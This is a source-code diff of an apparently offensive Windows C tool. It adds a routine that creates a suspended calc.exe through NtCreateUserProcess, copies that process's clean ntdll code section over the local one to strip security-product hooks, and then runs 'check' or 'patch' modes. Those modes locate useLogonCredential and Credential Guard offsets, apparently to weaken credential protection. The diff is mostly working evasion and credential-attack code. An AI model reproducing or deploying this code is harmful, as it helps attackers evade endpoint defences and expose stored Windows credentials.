@@ -5,13 +5,20 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #define OBJ_CASE_INSENSITIVE 0x00000040
 #define FILE_OPEN 0x00000001
+#define PS_ATTRIBUTE_IMAGE_NAME 0x20005
 
+typedef enum   _PROCESSINFOCLASS { ProcessBasicInformation = 0 } PROCESSINFOCLASS;
+typedef enum   _PS_CREATE_STATE { PsCreateInitialState, PsCreateFailOnFileOpen, PsCreateFailOnSectionCreate, PsCreateFailExeFormat, PsCreateFailMachineMismatch, PsCreateFailExeName, PsCreateSuccess, PsCreateMaximumStates } PS_CREATE_STATE;
 typedef struct { BYTE data[16]; } LargePointer;
 typedef struct _TOKEN_PRIVILEGES_STRUCT { DWORD PrivilegeCount; LUID Luid; DWORD Attributes; } TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;
 typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
 typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
 typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
-typedef enum _PROCESSINFOCLASS { ProcessBasicInformation = 0 } PROCESSINFOCLASS;
+typedef struct _RTL_DRIVE_LETTER_CURDIR { USHORT Flags, Length; ULONG TimeStamp; UNICODE_STRING DosPath; } RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
+typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength, Length, Flags, DebugFlags; HANDLE ConsoleHandle, StandardInput, StandardOutput, StandardError, CurrentDirectoryHandle; ULONG ConsoleFlags, StartingX, StartingY, CountX, CountY, CountCharsX, CountCharsY, FillAttribute, WindowFlags, ShowWindowFlags, EnvironmentSize; UNICODE_STRING CurrentDirectoryPath, DllPath, ImagePathName, CommandLine, WindowTitle, DesktopInfo, ShellInfo, RuntimeData; PVOID Environment; RTL_DRIVE_LETTER_CURDIR CurrentDirectories[32]; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+typedef struct _PS_ATTRIBUTE { ULONG_PTR Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE;
+typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[2]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
+typedef struct _PS_CREATE_INFO { SIZE_T Size; PS_CREATE_STATE State; union { struct { union { ULONG InitFlags; struct { UCHAR WriteOutputOnExit : 1, DetectManifest : 1, IFEOSkipDebugger : 1, IFEODoNotPropagateKeyState : 1, SpareBits1 : 4, SpareBits2 : 8; USHORT ProhibitedImageCharacteristics : 16; } s1; } u1; ACCESS_MASK AdditionalFileAccess; } InitState; struct { HANDLE FileHandle; } FailSection; struct { USHORT DllCharacteristics; } ExeFormat; struct { HANDLE IFEOKey; } ExeName; struct { union { ULONG OutputFlags; struct { UCHAR ProtectedProcess : 1, AddressSpaceOverride : 1, DevOverrideEnabled : 1, ManifestDetected : 1, ProtectedProcessLight : 1, SpareBits1 : 3, SpareBits2 : 8; USHORT SpareBits3 : 16; } s2; } u2; HANDLE FileHandle, SectionHandle; ULONGLONG UserProcessParametersNative; ULONG UserProcessParametersWow64, CurrentParameterFlags; ULONGLONG PebAddressNative; ULONG PebAddressWow64; ULONGLONG ManifestAddress; ULONG ManifestSize; } SuccessState; }; } PS_CREATE_INFO, * PPS_CREATE_INFO;
 
 typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
 typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
@@ -24,6 +31,12 @@ typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID Ap
 typedef NTSTATUS(WINAPI* NtWriteVirtualMemoryFn)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten);
 typedef NTSTATUS(WINAPI* NtTerminateProcessFn)(HANDLE ProcessHandle, int ExitStatus);
 typedef NTSTATUS(WINAPI* NtProtectVirtualMemoryFn)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
+typedef NTSTATUS(WINAPI* NtCreateUserProcessFn)(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList);
+typedef NTSTATUS(WINAPI* RtlCreateProcessParametersExFn)(PRTL_USER_PROCESS_PARAMETERS* pProcessParameters, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
+typedef NTSTATUS(WINAPI* RtlDestroyProcessParametersFn)(PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
+typedef PVOID   (WINAPI* RtlAllocateHeapFn)(PVOID HeapHandle, ULONG  Flags, SIZE_T Size);
+typedef NTSTATUS(WINAPI* RtlFreeHeapFn)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
+typedef NTSTATUS(WINAPI* RtlInitUnicodeStringFn)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
 
 NtOpenProcessTokenFn NtOpenProcessToken;
 NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken;
@@ -36,6 +49,12 @@ NtReadFileFn NtReadFile;
 NtWriteVirtualMemoryFn NtWriteVirtualMemory;
 NtTerminateProcessFn NtTerminateProcess;
 NtProtectVirtualMemoryFn NtProtectVirtualMemory;
+NtCreateUserProcessFn NtCreateUserProcess;
+RtlCreateProcessParametersExFn RtlCreateProcessParametersEx;
+RtlDestroyProcessParametersFn RtlDestroyProcessParameters;
+RtlAllocateHeapFn RtlAllocateHeap;
+RtlFreeHeapFn RtlFreeHeap;
+RtlInitUnicodeStringFn RtlInitUnicodeString;
 
 
 // Get SeDebugPrivilege privilege
@@ -459,6 +478,12 @@ void initializeFunctions() {
     NtWriteVirtualMemory = (NtWriteVirtualMemoryFn)CustomGetProcAddress(hNtdll, "NtWriteVirtualMemory");
     NtTerminateProcess = (NtTerminateProcessFn)CustomGetProcAddress(hNtdll, "NtTerminateProcess");
     NtProtectVirtualMemory = (NtProtectVirtualMemoryFn)CustomGetProcAddress(hNtdll, "NtProtectVirtualMemory");
+    NtCreateUserProcess = (NtCreateUserProcessFn)CustomGetProcAddress(hNtdll, "NtCreateUserProcess");
+    RtlCreateProcessParametersEx = (RtlCreateProcessParametersExFn)CustomGetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
+    RtlDestroyProcessParameters = (RtlDestroyProcessParametersFn)CustomGetProcAddress(hNtdll, "RtlDestroyProcessParameters");
+    RtlAllocateHeap = (RtlAllocateHeapFn)CustomGetProcAddress(hNtdll, "RtlAllocateHeap");
+    RtlFreeHeap = (RtlFreeHeapFn)CustomGetProcAddress(hNtdll, "RtlFreeHeap");
+    RtlInitUnicodeString = (RtlInitUnicodeStringFn)CustomGetProcAddress(hNtdll, "RtlInitUnicodeString");
 }
 
 
@@ -540,67 +565,38 @@ int* GetTextSectionInfo(LPVOID ntdll_address) {
 }
 
 
-LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
-    STARTUPINFOA si = { 0 };
-    si.cb = sizeof(STARTUPINFOA);
-    PROCESS_INFORMATION pi = { 0 };
-
-    BOOL createprocess_res = CreateProcessA(
-        process_path,
-        NULL,
-        NULL,
-        NULL,
-        FALSE,
-        DEBUG_PROCESS,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    );
-
-    if (!createprocess_res) {
-        printf("[-] Error calling CreateProcess\n");
-        ExitProcess(0);
-    }
-
+// Get ntdll from debug/suspended process 
+LPVOID MapNtdllFromSuspendedProc(HANDLE hProcess) {
     HANDLE currentProcess = (HANDLE)(-1);
     uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, "ntdll.dll");
     int* result = GetTextSectionInfo((void*)localNtdllHandle);
     int localNtdllTxtBase = result[0];
     int localNtdllTxtSize = result[1];
     LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);
-
     BYTE* ntdllBuffer = (BYTE*)malloc(localNtdllTxtSize);
     SIZE_T bytesRead;
     NTSTATUS readprocmem_res = NtReadVirtualMemory(
-        pi.hProcess,
+        hProcess,
         localNtdllTxt,
         ntdllBuffer,
         localNtdllTxtSize,
         &bytesRead
     );
-
     if (readprocmem_res != 0) {
         printf("[-] Error calling NtReadVirtualMemory\n");
-        ExitProcess(0);
+        exit(0);
     }
-
     LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;
-
-    BOOL debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
-    NTSTATUS terminateproc_res = NtTerminateProcess(pi.hProcess, 0);
-    if (!debugstop_res || (terminateproc_res != 0)) {
+    NTSTATUS terminateproc_res = NtTerminateProcess(hProcess, 0);
+    if (terminateproc_res != 0) {
         printf("[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
-        ExitProcess(0);
+        exit(0);
     }
-
-    NTSTATUS closehandle_proc = NtClose(pi.hProcess);
-    NTSTATUS closehandle_thread = NtClose(pi.hThread);
-    if (closehandle_proc != 0 || closehandle_thread != 0) {
+    NTSTATUS closehandle_proc = NtClose(hProcess);
+    if (closehandle_proc != 0) {
         printf("[-] Error calling NtClose\n");
-        ExitProcess(0);
+        exit(0);
     }
-
     return pNtdllBuffer;
 }
 
@@ -629,15 +625,9 @@ void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_
 }
 
 
-void RemapNtdll(bool debug) {
+void RemapNtdll(HANDLE hProcess) {
     const char* targetDll = "ntdll.dll";
-    const char* proc_path = "c:\\Windows\\System32\\calc.exe";
-
-    if (debug) {
-        printf("[+] DLL remap:\t\t\ttrue\n");
-    }
-
-    long long unhookedNtdllTxt = (long long)MapNtdllFromDebugProc(proc_path);
+    long long unhookedNtdllTxt = (long long)MapNtdllFromSuspendedProc(hProcess);
     HANDLE currentProcess = (HANDLE)(-1);
     uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, targetDll);
     int* textSectionInfo = GetTextSectionInfo((void*)localNtdllHandle);
@@ -645,10 +635,120 @@ void RemapNtdll(bool debug) {
     int localNtdllTxtSize = textSectionInfo[1];
     long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
     ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
+}
 
-    if (debug) {
-        printf("[+] DLL remap completed:\tCopied %d bytes from 0x%llX to 0x%llX\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
+
+// Concatenate chars and return wchar_t*
+wchar_t* get_concatenated_wchar_t(const char* str1, const char* str2, bool add_space) {
+    size_t len1 = strlen(str1);
+    size_t len2 = strlen(str2);
+    size_t total_len = len1 + len2 + 1;
+    if (add_space) {
+        total_len += 1;
     }
+    wchar_t* result = (wchar_t*)malloc(total_len * sizeof(wchar_t));
+    if (!result) return NULL;
+    for (size_t i = 0; i < len1; i++) {
+        result[i] = (wchar_t)(unsigned char)str1[i];
+    }
+    if (add_space) {
+        result[len1] = L' ';
+    }
+    for (size_t i = 0; i < len2; i++) {
+        if (add_space) {
+            result[len1 + 1 + i] = (wchar_t)(unsigned char)str2[i];
+        }
+        else {
+            result[len1 + i] = (wchar_t)(unsigned char)str2[i];
+        }
+    }
+    result[total_len - 1] = L'\0';
+    return result;
+}
+
+
+// Custom implementation for GetProcessHeap - NtQueryInformationProcess + NtReadVirtualMemory
+HANDLE CustomGetProcessHeap() {
+    const int process_basic_information_size = 48;
+    int peb_offset = 0x8;
+    BYTE pbi_byte_array[process_basic_information_size];
+    void* pbi_addr = (void*)pbi_byte_array;
+    ULONG ReturnLength;
+    NTSTATUS ntstatus = NtQueryInformationProcess((HANDLE)-1, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
+    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
+    void* pebaddress = *(void**)peb_pointer;
+    void* processHeapAddress = (void*)((uintptr_t)pebaddress + 0x30);
+    HANDLE heapHandle = NULL;
+    SIZE_T bytesRead;
+    ntstatus = NtReadVirtualMemory((HANDLE)-1, processHeapAddress, &heapHandle, sizeof(heapHandle), &bytesRead);
+    return (ntstatus == 0) ? heapHandle : NULL;
+}
+
+
+// Create process: RtlCreateProcessParametersEx + NtCreateUserProcess
+HANDLE CreateSuspProc(char* process_path) {
+    // Create process parameters
+    UNICODE_STRING NtImagePath;
+    RtlInitUnicodeString(&NtImagePath, get_concatenated_wchar_t("\\??\\", process_path, false));
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+    NTSTATUS ntstatus = RtlCreateProcessParametersEx(
+        &ProcessParameters,
+        &NtImagePath,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        1
+    );
+    if (ntstatus != 0) {
+        printf("[+] RtlCreateProcessParametersEx failed\n");
+        return NULL;
+    }
+    printf("[+] RtlCreateProcessParameters:\ttrue\n");
+
+    // Create the process
+    PS_CREATE_INFO CreateInfo = { 0 };
+    CreateInfo.Size = sizeof(CreateInfo);
+    CreateInfo.State = PsCreateInitialState;
+    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(
+        CustomGetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE) * 1);
+    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
+    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    AttributeList->Attributes[0].Size = NtImagePath.Length;
+    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
+    HANDLE hProcess = NULL, hThread = NULL;
+    ULONG threadFlags = 0x00000001;
+    ntstatus = NtCreateUserProcess(
+        &hProcess,
+        &hThread,
+        PROCESS_ALL_ACCESS,
+        THREAD_ALL_ACCESS,
+        NULL,
+        NULL,
+        NULL,
+        threadFlags,
+        ProcessParameters,
+        &CreateInfo,
+        AttributeList
+    );
+    if (ntstatus != 0) {
+        printf("[-] NtCreateUserProcess failed\n");
+        RtlFreeHeap(CustomGetProcessHeap(), 0, AttributeList);
+        RtlDestroyProcessParameters(ProcessParameters);
+        return NULL;
+    }
+    printf("[+] NtCreateUserProcess:\ttrue\n");
+
+    // Clean up
+    RtlFreeHeap(CustomGetProcessHeap(), 0, AttributeList);
+    RtlDestroyProcessParameters(ProcessParameters);
+    return hProcess;
 }
 
 
@@ -685,8 +785,11 @@ void exec(const char* option, bool debug) {
     // Parse PE File
     bool parse_bool = ParsePEFile(fileBuffer, 1024 * 1024, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
     if (!parse_bool) {
-        printf("[-] Failed to parse PE file.\n");
-        return;
+        parse_bool = ParsePEFile(fileBuffer, 1024 * 1024, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
+        if (!parse_bool) {
+            printf("[-] Failed to parse PE file.\n");
+            return;
+        }
     }
 
     int useLogonCredential_Offset = useLogonCredential + offset + 6;
@@ -792,13 +895,19 @@ int main(int argc, char* argv[]) {
 
     if (strcmp(firstArg, "check") == 0) {
         if (argc == 3 && strcmp(argv[2], "true") == 0) {
-            RemapNtdll(debug);
+            // Create suspended process
+            char* process_to_create = (char*)"c:\\Windows\\System32\\calc.exe";
+            HANDLE hProcess = CreateSuspProc(process_to_create);
+            RemapNtdll(hProcess);
         }
         exec("check", debug);
     }
     else if (strcmp(firstArg, "patch") == 0) {
         if (argc == 3 && strcmp(argv[2], "true") == 0) {
-            RemapNtdll(debug);
+            // Create suspended process
+            char* process_to_create = (char*)"c:\\Windows\\System32\\calc.exe";
+            HANDLE hProcess = CreateSuspProc(process_to_create);
+            RemapNtdll(hProcess);
         }
         exec("patch", debug);
     }
